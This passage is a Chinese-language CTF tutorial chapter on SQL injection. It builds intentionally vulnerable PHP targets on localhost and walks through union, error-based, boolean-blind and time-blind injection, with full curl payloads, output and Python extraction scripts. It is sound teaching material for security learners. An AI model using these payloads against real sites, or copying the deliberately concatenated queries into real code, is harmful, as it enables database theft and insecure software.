---
chapter: Web安全
section: SQL 注入
order: 604
tags:
  - CTF
  - Web安全
  - SQL注入
  - sqlmap
publish: true
---

# W04 SQL 注入
## SQL Injection

> [!info]- 章节信息
> **所属方向**：Web 安全 ｜ **难度阶段**：L2 核心漏洞期 ｜ **前置要求**：[[11-Web安全版图与Burp|11 章]] · [[W01-Web安全导论与HTTP深化|W01]] · [[W02-工具链实战与靶场搭建|W02]]
> **本章目标**：补齐零基础读者需要的 SQL 最小知识集；在自建靶场上完整走一遍注入的五类手法——联合查询、报错、布尔盲注、时间盲注、堆叠；掌握黑名单 WAF 的逐级绕过手法；会用 sqlmap 确认注入并拖库；知道防御该怎么写。

11 章用 Python + sqlite3 做过万能密码的最小演示：输入拼进 SQL 的那一刻，数据就变成了代码。那一小节回答的是"注入为什么存在"；本章回答剩下的全部问题——注入到手之后能做什么、页面不回显时怎么办、有关键字过滤时怎么绕、什么时候交给 sqlmap、以及写出打不进的代码。全部实验在两套自建 PHP 靶场上进行，一套接 MariaDB，一套接 SQLite，靶场代码完整给出，读完即可在自己的终端里复现。

> [!note] 本章约定
> 命令与输出成对给出，输出块标题写"输出："。所有 curl 统一加 `--noproxy '*'`：系统代理软件可能改写响应内容，该参数让 curl 直连目标。命令与输出按 PHP 8.5、MariaDB 11.8、sqlmap 1.10 编写，SQLite 为 3.46——版本差异主要影响报错文本的措辞，不影响手法本身。URL 里的空格写成 `%20`、单引号写成 `%27`、`#` 写成 `%23`，双引号内的 `&` 会截断参数，必须写 `%26`——后文的 payload 都遵守这套编码。

## 1. SQL 最小必要集

不假设你学过 SQL。这一节只讲注入会用到的部分，全部命令在装好的 MariaDB 与 SQLite 上直接可跑（客户端命令见 [[01-Linux环境与CTF实验环境搭建|01 章]]的软件安装一节）。

### 1.1 查询：SELECT / WHERE / ORDER BY

SQL 里"查"是 `SELECT ... FROM ... WHERE ...`：FROM 指定表，WHERE 给过滤条件，SELECT 决定输出哪几列。`ORDER BY 列名` 把结果排序，写成 `ORDER BY 数字` 时表示按第 N 列排序。`LIMIT n` 只取前 n 行。

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT id, username FROM users WHERE id > 1 ORDER BY username;"
```

输出：

```
id	username
3	alice
2	guest
```

注入最关心的两个行为：

- **WHERE 条件决定返回哪些行**。把条件改成恒真（`or 1=1`）就是全表返回——万能密码的原理，11 章已经拆过，不再重讲。
- **`ORDER BY 数字` 按列排序**。`ORDER BY 4` 在只有 3 列的查询上直接报错。==报错文本就是列数探测器==，第 3 节的第一个 payload 用的就是它。

### 1.2 UNION SELECT：把第二条查询拼上去

`UNION SELECT` 把另一条 SELECT 的结果**追加**到当前结果后面，两条查询的列数必须相同：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT id, username, password FROM users UNION SELECT 99, 'injected', 'row';"
```

输出：

```
id	username	password
1	admin	s3cr3t_pw
2	guest	guest123
3	alice	w0nd3rl4nd
99	injected	row
```

第 4 行不是 users 表里的数据，是 UNION 后半段直接构造出来的。==注入里 UNION 的价值：原查询查什么不由你定，但 UNION 后面那条查什么完全由你定==——只要知道原查询有几列，就能让任意表的任意数据出现在页面回显里。列数不符时数据库直接拒绝：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT username FROM users UNION SELECT 'x', 'y';"
```

输出：

```
--------------
SELECT username FROM users UNION SELECT 'x', 'y'
--------------

ERROR 1222 (21000) at line 1: The used SELECT statements have a different number of columns
```

### 1.3 字符串、引号与注释符

SQL 里字符串常量用单引号包裹，`CONCAT()` 把多个值拼成一个字符串：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT CONCAT(username, ':', password) FROM users WHERE id = 1;"
```

输出：

```
CONCAT(username, ':', password)
admin:s3cr3t_pw
```

Web 代码最常见的拼接写法是把用户输入嵌进引号里：

```sql
SELECT id, username, password FROM users WHERE id = '$id'
```

`$id` 为 `1` 时查询正常；`$id` 为 `1'` 时，第二个单引号把字符串提前闭死，剩下的内容变成 SQL 语法——==发送一个单引号看页面是否报错，是确认注入点最便宜的一步==。注入构造好之后，原查询尾巴上多出来的部分要用注释符处理掉。MariaDB 有三种注释：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT 1 + 1; # 到行尾"
mariadb -u ctf -pctf_pass ctf -e "SELECT 2 + 2; -- 双横线后要有空格"
mariadb -u ctf -pctf_pass ctf -e "SELECT /* 行内 */ 3 + 3;"
```

输出：

```
1 + 1
2
2 + 2
4
3 + 3
6
```

`--` 的"横线后必须有空格"这条规则有历史原因——没有空格时它会被当成两个减号：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT 10--3;"
mariadb -u ctf -pctf_pass ctf -e "SELECT 10 -- 3;"
```

输出：

```
10--3
13
10 -- 3
10
```

`10--3` 被解析成 `10 - (-3)` 得 13。==写 payload 时 `--` 后面的空格不能丢==，放进 URL 要写成 `--%20`。

### 1.4 元数据：information_schema 与 sqlite_master

注入的终点是拖数据，而拖数据的前提是知道库里有什么表、表里有什么列。这套"库的目录"由数据库自己维护：

**MariaDB / MySQL** 把目录放在 `information_schema` 库里，三张表依次回答三个问题：

```bash
mariadb -u ctf -pctf_pass ctf -e "SELECT schema_name FROM information_schema.schemata;"
mariadb -u ctf -pctf_pass ctf -e "SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema IN ('ctf','secret');"
mariadb -u ctf -pctf_pass ctf -e "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema = 'secret';"
```

输出：

```
schema_name
information_schema
secret
ctf
```

```
table_schema	table_name
secret	flags
ctf	users
```

```
table_schema	table_name	column_name
secret	flags	id
secret	flags	flag
```

三步正好是拖库 → 拖表 → 拖列。注意 `schemata` 只列出当前账号有权限看到的库——权限越小的账号，目录页越薄。

**SQLite** 没有独立的目录库，目录是一张每个库自带的 `sqlite_master` 表，`sql` 列直接存着建表语句：

```bash
sqlite3 ctf.sqlite "SELECT name, sql FROM sqlite_master WHERE type = 'table';"
```

输出：

```
users|CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)
flags|CREATE TABLE flags(id INTEGER PRIMARY KEY, flag TEXT)
```

==建表语句里连列名带类型都写着==，一条查询顶 information_schema 三连。

### 1.5 两套数据库的方言差异

CTF 题的后端数据库以 MySQL/MariaDB 和 SQLite 最多，同一套手法两边参数不同。本章两套靶场各跑一遍，就是为了让差异看得见：

| 特性 | MySQL / MariaDB | SQLite |
| ---- | ---- | ---- |
| 元数据 | `information_schema` 的 schemata / tables / columns | 每库一张 `sqlite_master`，列名在建表语句里 |
| 字符串拼接 | `CONCAT()` 函数；`\|\|` 默认是**逻辑或**（3.44 起也有 CONCAT） | `\|\|` 运算符 |
| 报错注入 | `extractvalue()` / `updatexml()` 等 XPath 报错 | 没有对应函数 |
| 延时 | `sleep(n)`（另有 `benchmark()`） | 无原生延时函数 |
| 堆叠执行 | `mysqli_multi_query()`；PDO 默认（模拟预处理）下也可行 | `SQLite3::exec()` / PDO `exec()` 可行，`query()` 只执行第一条 |
| 文件读写 | `LOAD_FILE()` 读、`INTO OUTFILE` / `DUMPFILE` 写，受 `secure_file_priv` 约束 | `ATTACH DATABASE` 写库文件；`readfile()` 只在 CLI shell 里有 |
| 注释符 | `-- ` 、`#`、`/* */` | `-- `、`/* */` |
| 版本函数 | `version()` | `sqlite_version()` |

> [!warning] 双竖线的坑
> 在 MariaDB 里写 `'a' || 'b'` 想拼字符串，拿到的是 0——`||` 默认是逻辑或，不是拼接：
>
> ```bash
> mariadb -u ctf -pctf_pass ctf -e "SELECT 'a' || 'b';"
> ```
>
> 输出：
>
> ```
> 'a' || 'b'
> 0
> ```
>
> SQLite 里同样的表达式返回 `ab`。把 MySQL 语法原样搬到 SQLite（或反过来）是盲注脚本报"语法错误"的常见来源。

## 2. 自建靶场

练习注入需要自己搭靶。本章按"回显靶"与"盲注靶"两型、MariaDB 与 SQLite 两库，一共四个靶，外加第 7、8 节要用的堆叠靶、WAF 靶与防御对照靶。全部是单文件 PHP，用 PHP 内置服务器跑，不装 Apache/Nginx。

### 2.1 建库

MariaDB 侧建两个库：`ctf`（users 表）和 `secret`（flags 表），再建两个账号——==只读的 `ctf` 给普通靶用，全权的 `dev` 给堆叠靶用，这个权限差在第 7 节会变成攻击面的差别==：

```sql
-- init_mysql.sql（用 root 执行：sudo mariadb < init_mysql.sql）
DROP DATABASE IF EXISTS secret;
CREATE DATABASE secret;
USE secret;
CREATE TABLE flags(id INT PRIMARY KEY, flag VARCHAR(100));
INSERT INTO flags VALUES(1, 'flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t}');

DROP DATABASE IF EXISTS ctf;
CREATE DATABASE ctf;
USE ctf;
CREATE TABLE users(
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50),
    password VARCHAR(50)
);
INSERT INTO users(username, password) VALUES
    ('admin', 's3cr3t_pw'),
    ('guest', 'guest123'),
    ('alice', 'w0nd3rl4nd');

DROP USER IF EXISTS 'ctf'@'localhost';
CREATE USER 'ctf'@'localhost' IDENTIFIED BY 'ctf_pass';
GRANT SELECT ON ctf.* TO 'ctf'@'localhost';
GRANT SELECT ON secret.* TO 'ctf'@'localhost';

DROP USER IF EXISTS 'dev'@'localhost';
CREATE USER 'dev'@'localhost' IDENTIFIED BY 'dev_pass';
GRANT ALL PRIVILEGES ON *.* TO 'dev'@'localhost';

FLUSH PRIVILEGES;
```

MariaDB root 在多数发行版默认走 unix_socket 认证，终端里 `sudo mariadb` 即可进入，不需要密码。SQLite 侧一个文件就是一个库，建库一条命令：

```bash
sqlite3 ctf.sqlite "CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT);
INSERT INTO users VALUES(1,'admin','s3cr3t_pw'),(2,'guest','guest123'),(3,'alice','w0nd3rl4nd');
CREATE TABLE flags(id INTEGER PRIMARY KEY, flag TEXT);
INSERT INTO flags VALUES(1,'flag{sql1t3_un10n_v14_sql1t3_m4st3r}');"
```

### 2.2 四个 PHP 靶

**靶一：MariaDB 回显靶**（`target_mysql_echo.php`，端口 8401）。GET 参数 `id` 直接拼进 SQL，查询结果全部回显，`display_errors` 打开且异常消息原样输出——==报错注入靠的就是这一行"原样输出"==：

```php
<?php
// target_mysql_echo.php —— GET 参数 id 直接拼进 SQL，查询结果回显
ini_set('display_errors', '1');
error_reporting(E_ALL);
header('Content-Type: text/plain; charset=utf-8');

$id = $_GET['id'] ?? '1';
try {
    $pdo = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'ctf', 'ctf_pass', [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    ]);
    $sql = "SELECT id, username, password FROM users WHERE id = '$id'";
    echo "[SQL] $sql\n";
    foreach ($pdo->query($sql) as $row) {
        echo $row['id'], ' | ', $row['username'], ' | ', $row['password'], "\n";
    }
} catch (Throwable $e) {
    echo "[ERROR] ", $e->getMessage(), "\n";
}
```

**靶二：SQLite 回显靶**（`target_sqlite_echo.php`，端口 8402）。只有连接串不同，其余逐字相同：

```php
<?php
// target_sqlite_echo.php —— 同样的拼接，库换成 ctf.sqlite
ini_set('display_errors', '1');
error_reporting(E_ALL);
header('Content-Type: text/plain; charset=utf-8');

$id = $_GET['id'] ?? '1';
try {
    $pdo = new PDO('sqlite:' . __DIR__ . '/ctf.sqlite');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $sql = "SELECT id, username, password FROM users WHERE id = '$id'";
    echo "[SQL] $sql\n";
    foreach ($pdo->query($sql) as $row) {
        echo $row['id'], ' | ', $row['username'], ' | ', $row['password'], "\n";
    }
} catch (Throwable $e) {
    echo "[ERROR] ", $e->getMessage(), "\n";
}
```

**靶三：MariaDB 盲注靶**（`target_mysql_blind.php`，端口 8403）。无回显，页面只有两种状态——查到行输出 `user exists`，查不到（或出错）输出 `user not found`：

```php
<?php
// target_mysql_blind.php —— 无回显，只回答"存在 / 不存在"两态
header('Content-Type: text/plain; charset=utf-8');

$id = $_GET['id'] ?? '1';
try {
    $pdo = new PDO('mysql:host=127.0.0.1;dbname=ctf', 'ctf', 'ctf_pass', [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    ]);
    $row = $pdo->query("SELECT username FROM users WHERE id = '$id'")->fetch();
    echo $row ? 'user exists' : 'user not found';
} catch (Throwable $e) {
    // 出错也只给"不存在"，页面保持严格两态
    echo 'user not found';
}
```

> [!info]- SQLite 盲注靶（target_sqlite_blind.php，端口 8404）
> 与靶三只有连接方式不同，完整代码如下：
>
> ```php
> <?php
> header('Content-Type: text/plain; charset=utf-8');
>
> $id = $_GET['id'] ?? '1';
> try {
>     $pdo = new PDO('sqlite:' . __DIR__ . '/ctf.sqlite');
>     $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
>     $row = $pdo->query("SELECT username FROM users WHERE id = '$id'")->fetch();
>     echo $row ? 'user exists' : 'user not found';
> } catch (Throwable $e) {
>     echo 'user not found';
> }
> ```

### 2.3 启动与基线

PHP 内置服务器一个进程服务一个端口，路由脚本参数直接指到对应靶文件：

```bash
php -S 127.0.0.1:8401 target_mysql_echo.php &
php -S 127.0.0.1:8402 target_sqlite_echo.php &
php -S 127.0.0.1:8403 target_mysql_blind.php &
php -S 127.0.0.1:8404 target_sqlite_blind.php &
```

四个靶各访问一次，确认基线响应：

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8401/?id=1'
curl -s --noproxy '*' 'http://127.0.0.1:8402/?id=1'
curl -s --noproxy '*' 'http://127.0.0.1:8403/?id=1'
curl -s --noproxy '*' 'http://127.0.0.1:8404/?id=1'
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1'
1 | admin | s3cr3t_pw
[SQL] SELECT id, username, password FROM users WHERE id = '1'
1 | admin | s3cr3t_pw
user exists
user exists
```

8401 上故意发一个坏引号，看错误如何暴露：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1''
[ERROR] SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

`[SQL]` 行回显了最终执行的语句，`[ERROR]` 行回显了数据库原话。==这两行是教学用的真实信息面：手工注入的每一步，都是在跟这两行打交道==。

## 3. 联合查询注入

页面能把查询结果打印出来时，联合查询是信息收益最高的打法。目标只有三个：原查询有几列、哪几列会显示在页面上、想要的数据在哪张表哪列。

### 3.1 定列数：order by

`ORDER BY 数字` 按"结果集的第 N 列"排序，N 超过列数就报错。真条件假条件先各发一发，确认引号闭合正确：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%201=1--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and 1=1-- '
1 | admin | s3cr3t_pw
```

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%201=2--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and 1=2-- '
```

真条件返回行、假条件空手而归，说明 `1'` 的闭合成立、`--%20` 注释生效。接着二分列数：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20order%20by%203--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' order by 3-- '
```

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20order%20by%204--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' order by 4-- '
[ERROR] SQLSTATE[42S22]: Column not found: 1054 Unknown column '4' in 'ORDER BY'
```

`order by 3` 正常、`order by 4` 报 `Unknown column '4'`——原查询有 3 列。`-1` 是随便选的一个不存在的 id，让原查询返回空行，页面只剩 UNION 后半段的结果，干扰最小。

### 3.2 定回显位：union select

凑够 3 列发起 UNION，看哪几列的位置会被打印：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20union%20select%201,2,3--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,3-- '
1 | 2 | 3
```

三个位置全部回显。==回显位就是输出通道==：把任意子查询填进第 1、2、3 位中的任何一个，页面就会打印它的结果。

### 3.3 MariaDB 拖库全链

按 1.4 节的三步走：库 → 表 → 列 → 数据。列名多时用 `group_concat()` 把多行压进一个回显位：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20union%20select%201,2,schema_name%20from%20information_schema.schemata--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,schema_name from information_schema.schemata-- '
1 | 2 | information_schema
1 | 2 | secret
1 | 2 | ctf
```

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20union%20select%201,2,group_concat(table_schema,0x2e,table_name)%20from%20information_schema.tables%20where%20table_schema%20in%20('ctf','secret')--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,group_concat(table_schema,0x2e,table_name) from information_schema.tables where table_schema in ('ctf','secret')-- '
1 | 2 | secret.flags,ctf.users
```

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='flags'--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='flags'-- '
1 | 2 | id,flag
```

最后一步，跨库取数（`ctf` 账号在 `secret` 库上有 SELECT 权限）：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=-1'%20union%20select%201,2,flag%20from%20secret.flags--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,flag from secret.flags-- '
1 | 2 | flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t}
```

==从"一个带参数的页面"到"任意库任意表的数据"，五个步骤==：闭合确认、order by 定列、union 定回显位、information_schema 三连、取数。

### 3.4 SQLite：sqlite_master 对应跑一遍

SQLite 靶（8402）上同一套流程，元数据换成 `sqlite_master`：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8402/?id=-1'%20order%20by%204--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' order by 4-- '
[ERROR] SQLSTATE[HY000]: General error: 1 1st ORDER BY term out of range - should be between 1 and 3
```

报错文本不同（SQLite 直接告诉你合法范围是 1 到 3），信息量相同。拖表结构：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8402/?id=-1'%20union%20select%201,name,sql%20from%20sqlite_master--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,name,sql from sqlite_master-- '
1 | flags | CREATE TABLE flags(id INTEGER PRIMARY KEY, flag TEXT)
1 | users | CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT)
```

取数：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8402/?id=-1'%20union%20select%201,2,flag%20from%20flags--%20"
curl -s --noproxy '*' "http://127.0.0.1:8402/?id=-1'%20union%20select%201,2,sqlite_version()--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,flag from flags-- '
1 | 2 | flag{sql1t3_un10n_v14_sql1t3_m4st3r}
[SQL] SELECT id, username, password FROM users WHERE id = '-1' union select 1,2,sqlite_version()-- '
1 | 2 | 3.46.1
```

## 4. 报错注入

回显位不是总有——很多页面只打印"查询成功/失败"而不打印内容，但错误消息往往还是放出来的。报错注入把要读的数据塞进报错文本里，借错误页当回显位。这是 MariaDB/MySQL 的专属手法。

### 4.1 extractvalue / updatexml 的报错原理

两个函数都是 XML 处理函数：`extractvalue(XML文档, XPath路径)` 从文档里按 XPath 取值。当第二个参数不是合法 XPath 时，函数抛错，==并且把不合法的表达式内容带进错误消息==。构造一个必然失败的 XPath，把子查询的结果拼进去：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%20extractvalue(1,concat(0x7e,(select%20flag%20from%20secret.flags)))--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and extractvalue(1,concat(0x7e,(select flag from secret.flags)))-- '
[ERROR] SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~flag{xp4th_3rr0r_1nj3ct10n_c...'
```

`0x7e` 是 `~` 的十六进制写法——`~` 不是合法的 XPath 起始字符，函数必然报错，错误消息里带着 concat 的全部内容。`updatexml(文档, XPath, 新值)` 同理：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%20updatexml(1,concat(0x7e,(select%20flag%20from%20secret.flags)),1)--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and updatexml(1,concat(0x7e,(select flag from secret.flags)),1)-- '
[ERROR] SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~flag{xp4th_3rr0r_1nj3ct10n_c...'
```

报错注入不依赖回显位，只需要两点：错误消息会显示在页面上，以及==注入点在 AND / OR 这类布尔上下文里==（函数在 WHERE 子句里被求值才会触发报错）。

### 4.2 32 字符截断与 substr 挪窗口

仔细看上面的报错：flag 只带出了前一段，末尾是 `...`——==错误消息在约 32 个字符处被截断，末尾的省略号是数据库补的==。读完整内容用 `substr(串, 起点, 长度)` 挪窗口，第一发读 1–30 位左右，第二发从第 25 位起再读一段（重叠几位防漏）：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%20extractvalue(1,concat(0x7e,substr((select%20flag%20from%20secret.flags),25,40)))--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and extractvalue(1,concat(0x7e,substr((select flag from secret.flags),25,40)))-- '
[ERROR] SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~0n_c4rr13s_0v3r_32_l1m1t}'
```

两段拼起来就是完整的 49 字符 flag。报错注入也能查任意表达式，比如确认版本：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8401/?id=1'%20and%20extractvalue(1,concat(0x7e,version()))--%20"
```

输出：

```
[SQL] SELECT id, username, password FROM users WHERE id = '1' and extractvalue(1,concat(0x7e,version()))-- '
[ERROR] SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~11.8.6-MariaDB-5ubuntu0.1 fr...'
```

> [!warning] SQLite 没有报错注入可走
> `extractvalue`、`updatexml` 是 MySQL/MariaDB 的函数，SQLite 里不存在。在 8402 上发同样的 payload 只会得到"函数不存在"的报错，带不出数据。==SQLite 页面只给两态时，唯一通用打法是盲注==——这正是下一节。

## 5. 布尔盲注

页面不回显数据，但"查到行"与"查不到行"长得不一样（哪怕只是标题不同、内容长短不同）——这个差异就是一个可以提问的信道。

### 5.1 两态响应面

盲注靶（8403）的响应面：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%201=1--%20"; echo
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%201=2--%20"; echo
```

输出：

```
user exists
user not found
```

`and` 后面接一个布尔表达式：表达式为真则原查询保留 `id=1` 的行（user exists），为假则整条查询空手而归（user not found）。==把子查询写进这个位置，页面就变成一台"真/假应答机"==：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%20(select%20ascii(substr(flag,1,1))%20from%20secret.flags)%20%3E%20100--%20"; echo
```

输出：

```
user exists
```

`ascii()` 取字符的 ASCII 码，`substr(串, 位, 长度)` 取子串——这条 payload 在问："flag 的第 1 个字符的编码大于 100 吗？"

### 5.2 手工二分

每个字符的编码在 32–126 之间，二分 7 次必中（$\lceil\log_2 95\rceil = 7$）。手工走一遍第 1 个字符（已知答案 'f' = 102）：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%20(select%20ascii(substr(flag,1,1))%20from%20secret.flags)%20%3E%20100--%20"; echo
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%20(select%20ascii(substr(flag,1,1))%20from%20secret.flags)%20%3E%20103--%20"; echo
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%20(select%20ascii(substr(flag,1,1))%20from%20secret.flags)%20%3E%20101--%20"; echo
curl -s --noproxy '*' "http://127.0.0.1:8403/?id=1'%20and%20(select%20ascii(substr(flag,1,1))%20from%20secret.flags)%20%3E%20102--%20"; echo
```

输出：

```
user exists
user not found
user exists
user not found
```

大于 100 成立、大于 103 不成立、大于 101 成立、大于 102 不成立——夹出 102，即 `'f'`。==每个字符最多 7 发，49 字符的 flag 约 350 发请求，手工不现实，交给脚本==。

### 5.3 完整脚本

先二分长度，再逐字符二分编码。全文如下（`requests` 的用法见 [[06-Python与CTF脚本基础|06 章]]）：

```python
#!/usr/bin/env python3
# blind_bool.py —— 对盲注靶(8403)逐字符二分，拖出 secret.flags 里的 flag
import requests

URL = 'http://127.0.0.1:8403/'

def ask(cond: str) -> bool:
    """把一个 SQL 布尔条件包进注入语句去问靶机，页面出现 user exists 即为真"""
    r = requests.get(URL, params={'id': f"1' and ({cond})-- "}, timeout=10)
    return 'user exists' in r.text

# 第一步：二分问出长度
lo, hi = 0, 200
while lo < hi:
    mid = (lo + hi) // 2
    if ask(f'(select length(flag) from secret.flags) > {mid}'):
        lo = mid + 1
    else:
        hi = mid
length = lo
print(f'flag 长度: {length}')

# 第二步：逐字符对 ASCII 码二分
flag = ''
for pos in range(1, length + 1):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if ask(f'(select ascii(substr(flag,{pos},1)) from secret.flags) > {mid}'):
            lo = mid + 1
        else:
            hi = mid
    flag += chr(lo)
    print(f'[{pos:2d}/{length}] {flag}')

print('拖出的 flag:', flag)
```

运行（输出节选，中间各行为同构的逐位推进）：

```bash
python3 blind_bool.py
```

输出：

```
flag 长度: 49
[ 1/49] f
[ 2/49] fl
[ 3/49] fla
[ 4/49] flag
[ 5/49] flag{
……（第 6–47 行同构，逐位推进）……
[48/49] flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t
[49/49] flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t}
拖出的 flag: flag{xp4th_3rr0r_1nj3ct10n_c4rr13s_0v3r_32_l1m1t}
```

脚本没有读过一行页面之外的代码，==数据完全由"问真/假"还原==。把子查询换成 `sqlite_master` 相关的任意表达式，同一脚本在 8404 的 SQLite 盲注靶上照跑：

```bash
curl -s --noproxy '*' "http://127.0.0.1:8404/?id=1'%20and%20(select%20length(flag)%20from%20flags)%20%3E%2010--%20"; echo
curl -s --noproxy '*' "http://127.0.0.1:8404/?id=1'%20and%20(select%20length(flag)%20from%20flags)%20%3E%20100--%20"; echo
```

输出：

```
user exists
user not found
```

## 6. 时间盲注

连两态差异都没有的页面（两种响应一模一样），还有一个物理量可测：响应耗时。

### 6.1 sleep() + if() 与 curl 计时

MariaDB 的 `sleep(n)` 睡 n 秒，`if(条件, a, b)` 按条件取值。组合成"条件为真才睡"：

```bash
curl -s --noproxy '*' -o /dev/null -w 'time_total=%{time_total}s\n' "http://127.0.0.1:8403/?id=1'%20and%20if(1=1,sleep(1),0)--%20"
curl -s --noproxy '*' -o /dev/null -w 'time_total=%{time_total}s\n' "http://127.0.0.1:8403/?id=1'%20and%20if(1=2,sleep(1),0)--%20"
```

输出：

```
time_total=1.003055s
time_total=0.003786s
```

真条件 1 秒、假条件几乎为零——==耗时就是真/假应答==。curl 的 `-w '%{time_total}'` 打印总耗时，`-o /dev/null` 丢掉响应体。把它接进二分：

```bash
curl -s --noproxy '*' -o /dev/null -w 'time_total=%{time_total}s\n' "http://127.0.0.1:8403/?id=1'%20and%20if((select%20ascii(substr(flag,1,1))%20from%20secret.flags)%3E100,sleep(1),0)--%20"
curl -s --noproxy '*' -o /dev/null -w 'time_total=%{time_total}s\n' "http://127.0.0.1:8403/?id=1'%20and%20if((select%20ascii(substr(flag,1,1))%20from%20secret.flags)%3E103,sleep(1),0)--%20"
```

输出：

```
time_total=1.003039s
time_total=0.002383s
```

### 6.2 脚本

与布尔脚本同构，只把"读页面两态"换成"测耗时"。这里拖 admin 的密码（9 字符，运行更快；换子查询即可拖 flag）：

```python
#!/usr/bin/env python3
# blind_time.py —— 用 sleep() + if() 按响应耗时逐字符拖出 admin 的密码
import time
import requests

URL = 'http://127.0.0.1:8403/'
DELAY = 0.5        # sleep 的秒数
THRESHOLD = 0.3    # 耗时超过它判定为"睡了"

def cond_true(cond: str) -> bool:
    payload = f"1' and if(({cond}), sleep({DELAY}), 0)-- "
    t0 = time.perf_counter()
    requests.get(URL, params={'id': payload}, timeout=10)
    return time.perf_counter() - t0 > THRESHOLD

pwd = ''
for pos in range(1, 10):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if cond_true(f'(select ascii(substr(password,{pos},1)) from users '
                     f'where username=0x61646d696e) > {mid}'):
            lo = mid + 1
        else:
            hi = mid
    pwd += chr(lo)
    print(f'[{pos}/9] {pwd}')

print('拖出的密码:', pwd)
```

`0x61646d696e` 是字符串 `'admin'` 的十六进制字面量（0x61='a'、0x64='d'、0x6d='m'、0x69='i'、0x6e='n'），写 hex 而不是引号，是为了不让字符集和引号转义问题进脚本。运行：

```bash
python3 blind_time.py
```

输出：

```
[1/9] s
[2/9] s3
[3/9] s3c
[4/9] s3cr
[5/9] s3cr3
[6/9] s3cr3t
[7/9] s3cr3t_
[8/9] s3cr3t_p
[9/9] s3cr3t_pw
拖出的密码: s3cr3t_pw
```

> [!warning] 时间盲注的噪声与 SQLite 的空白
